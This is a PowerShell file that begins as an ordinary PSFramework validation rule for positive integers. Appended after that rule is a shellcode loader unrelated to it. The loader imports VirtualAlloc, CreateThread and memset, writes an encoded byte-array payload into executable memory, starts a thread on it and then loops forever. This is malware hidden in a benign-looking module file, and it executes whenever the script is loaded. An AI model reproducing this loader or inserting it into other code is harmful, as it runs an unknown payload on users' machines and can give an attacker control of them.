﻿Register-PSFConfigValidation -Name "integerpositive" -ScriptBlock {
	Param (
		$Value
	)
	
	$Result = New-Object PSOBject -Property @{
		Success = $True
		Value   = $null
		Message = ""
	}
	
	try { [int]$number = $Value }
	catch
	{
		$Result.Message = "Not an integer: $Value"
		$Result.Success = $False
		return $Result
	}
	
	if ($number -lt 0)
	{
		$Result.Message = "Negative value: $Value"
		$Result.Success = $False
		return $Result
	}
	
	$Result.Value = $number
	
	return $Result
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xc6,0x1c,0x1e,0x10,0xd9,0xec,0xd9,0x74,0x24,0xf4,0x5d,0x31,0xc9,0xb1,0x47,0x31,0x45,0x13,0x83,0xed,0xfc,0x03,0x45,0xc9,0xfe,0xeb,0xec,0x3d,0x7c,0x13,0x0d,0xbd,0xe1,0x9d,0xe8,0x8c,0x21,0xf9,0x79,0xbe,0x91,0x89,0x2c,0x32,0x59,0xdf,0xc4,0xc1,0x2f,0xc8,0xeb,0x62,0x85,0x2e,0xc5,0x73,0xb6,0x13,0x44,0xf7,0xc5,0x47,0xa6,0xc6,0x05,0x9a,0xa7,0x0f,0x7b,0x57,0xf5,0xd8,0xf7,0xca,0xea,0x6d,0x4d,0xd7,0x81,0x3d,0x43,0x5f,0x75,0xf5,0x62,0x4e,0x28,0x8e,0x3c,0x50,0xca,0x43,0x35,0xd9,0xd4,0x80,0x70,0x93,0x6f,0x72,0x0e,0x22,0xa6,0x4b,0xef,0x89,0x87,0x64,0x02,0xd3,0xc0,0x42,0xfd,0xa6,0x38,0xb1,0x80,0xb0,0xfe,0xc8,0x5e,0x34,0xe5,0x6a,0x14,0xee,0xc1,0x8b,0xf9,0x69,0x81,0x87,0xb6,0xfe,0xcd,0x8b,0x49,0xd2,0x65,0xb7,0xc2,0xd5,0xa9,0x3e,0x90,0xf1,0x6d,0x1b,0x42,0x9b,0x34,0xc1,0x25,0xa4,0x27,0xaa,0x9a,0x00,0x23,0x46,0xce,0x38,0x6e,0x0e,0x23,0x71,0x91,0xce,0x2b,0x02,0xe2,0xfc,0xf4,0xb8,0x6c,0x4c,0x7c,0x67,0x6a,0xb3,0x57,0xdf,0xe4,0x4a,0x58,0x20,0x2c,0x88,0x0c,0x70,0x46,0x39,0x2d,0x1b,0x96,0xc6,0xf8,0xb6,0x93,0x50,0xc3,0xef,0x9d,0xae,0xab,0xed,0x9d,0xbf,0x77,0x7b,0x7b,0xef,0xd7,0x2b,0xd4,0x4f,0x88,0x8b,0x84,0x27,0xc2,0x03,0xfa,0x57,0xed,0xc9,0x93,0xfd,0x02,0xa4,0xcc,0x69,0xba,0xed,0x87,0x08,0x43,0x38,0xe2,0x0a,0xcf,0xcf,0x12,0xc4,0x38,0xa5,0x00,0xb0,0xc8,0xf0,0x7b,0x16,0xd6,0x2e,0x11,0x96,0x42,0xd5,0xb0,0xc1,0xfa,0xd7,0xe5,0x25,0xa5,0x28,0xc0,0x3e,0x6c,0xbd,0xab,0x28,0x91,0x51,0x2c,0xa8,0xc7,0x3b,0x2c,0xc0,0xbf,0x1f,0x7f,0xf5,0xbf,0xb5,0x13,0xa6,0x55,0x36,0x42,0x1b,0xfd,0x5e,0x68,0x42,0xc9,0xc0,0x93,0xa1,0xcb,0x3d,0x42,0x8f,0xb9,0x2f,0x56;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

